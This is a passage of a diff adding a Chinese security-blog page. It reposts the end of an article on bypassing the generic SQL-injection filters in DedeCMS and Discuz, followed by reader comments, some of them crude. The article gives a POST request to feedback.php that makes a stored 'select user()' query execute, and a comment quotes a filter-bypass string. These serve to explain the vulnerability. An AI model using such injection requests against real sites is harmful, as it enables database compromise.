+<p style="text-indent:2em;">
+	被插入数据库中的内容，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="被插入数据库中的内容" alt="被插入数据库中的内容" src="/file/old/2839_p22.png" width="658" height="216" /> 
+</p>
+<p style="text-indent:2em;">
+	下面再POST如下内容给feedback.php，
+</p>
+<pre class="prettyprint">action=send&amp;comtype=reply&amp;aid=1&amp;isconfirm=yes&amp;feedbacktype=feedback&amp;fid=50</pre>
+<p style="text-indent:2em;">
+	跟踪一下这里执行的SQL语句，如图所示
+</p>
+<p style="text-indent:2em;">
+	<img title="这里执行的SQL语句" alt="这里执行的SQL语句" src="/file/old/2840_p23.png" width="659" height="243" /> 
+</p>
+<p style="text-indent:2em;">
+	所以select user()执行了，并且可以作为msg字段输出。
+</p>
+<p style="text-indent:2em;">
+	<strong>0x04 总结</strong> 
+</p>
+<p style="text-indent:2em;">
+	在写这篇文章之前，我分析了很多常用的cms系统的源码，包括discuz、dedecms、phpwind、phpcms等，只有在discuz、dedecms这两个系统中用到通用防注入，但是它们所覆盖的用户群已将相当庞大了。如果能在发现程序注入漏洞的情况下，这些绕过方法还是很有价值的。
+</p>
+<p style="text-indent:2em;">
+	<a href="http://drops.wooyun.org/papers/353" target="_blank">[原文地址]</a> 
+</p>
+<p>
+	<strong>各种吐槽：</strong> 
+</p>
+<p style="text-indent:2em;">
+	nauscript | 2013/07/29 17:26 | #
+</p>
+<p style="text-indent:2em;">
+	很详细 有没有关于绕过D盾的例子
+</p>
+<p style="text-indent:2em;">
+	有妹子送上 | 2013/07/29 18:42 | #
+</p>
+<p style="text-indent:2em;">
+	涨姿势了
+</p>
+<p style="text-indent:2em;">
+	酱油甲 | 2013/07/29 22:11 | #
+</p>
+<p style="text-indent:2em;">
+	涨姿势了
+</p>
+<p style="text-indent:2em;">
+	Gavin | 2013/07/30 09:39 | #
+</p>
+<p style="text-indent:2em;">
+	lz是骚货
+</p>
+<p style="text-indent:2em;">
+	genxor | 2013/07/30 22:36 | #
+</p>
+<p style="text-indent:2em;">
+	日你
+</p>
+<p style="text-indent:2em;">
+	疯狂的dabing | 2013/07/30 16:08 | #
+</p>
+<p style="text-indent:2em;">
+	以前觉得80sec那个防注入写的非常好，把所有的程序都加上了这段代码。。。直到后来一个dedecms被黑了，从日志中找到了@`'`。。。
+</p>
+<p style="text-indent:2em;">
+	ccSec | 2013/07/30 20:13 | #
+</p>
+<p style="text-indent:2em;">
+	超屌的文章，想问下LZ是用什么IDE来调试PHP的~
+</p>
+<p style="text-indent:2em;">
+	冰杰 | 2013/07/30 22:47 | #
+</p>
+<p style="text-indent:2em;">
+	碉堡~
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="4635,3780,211.155.120.240">
+<p>核007 @ 2013-08-01 10:56:21</p>
+<p style="text-indent:2em">核总录制个视频教程！研究php代码审计!!</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">自己研究，没那个时间去录什么教程。</p>
+</blockquote>
+<blockquote id="4665,3780,221.239.119.99">
+<p>佚名 @ 2013-08-05 14:08:41</p>
+<p style="text-indent:2em">核总那个跟踪变量的东西叫啥</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">不清楚</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">genxor</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2013-07-31
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E7%BB%95%E8%BF%87/">绕过</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+          <a href="https://lcx.cc/tags/cms/">CMS</a>
+          <a href="https://lcx.cc/tags/dedecms/">dedecms</a>
+          <a href="https://lcx.cc/tags/discuz/">Discuz</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ids/">IDS</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/mysql/">Mysql</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/%E6%9F%A5%E8%AF%A2/">查询</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E9%BB%91%E5%AE%A2/">黑客</a>
+          <a href="https://lcx.cc/tags/%E6%A3%80%E6%B5%8B/">检测</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3781/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">SVN安装配置及安全注意事项</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3779/">
+            <span class="next-text nav-default">闲扯下午引爆乌云社区“盗窃”乌云币事件</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
